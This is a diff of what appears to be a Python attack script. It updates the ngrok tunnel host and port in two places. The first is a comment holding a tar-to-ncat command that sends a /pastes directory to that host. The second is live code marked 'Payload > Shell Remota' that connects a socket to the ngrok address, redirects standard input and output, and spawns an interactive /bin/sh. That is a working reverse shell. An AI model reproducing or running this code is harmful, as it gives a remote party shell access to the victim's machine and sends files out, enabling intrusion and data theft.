@@ -22,7 +22,7 @@ reset = '\033[0;0m'
 # Vars
 back = False
 
-# tar czp /pastes | ncat 8.tcp.ngrok.io 15456
+# tar czp /pastes | ncat 4.tcp.ngrok.io 10624
 # nc -lvp 333 | tar zxv
 
 # Libs
@@ -64,7 +64,7 @@ while (back == False):
 
         #Payload > Shell Remota
         s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
-        s.connect(("8.tcp.ngrok.io",15456))
+        s.connect(("4.tcp.ngrok.io",10624))
         os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
         subprocess.call(["/bin/sh","-i"])
     
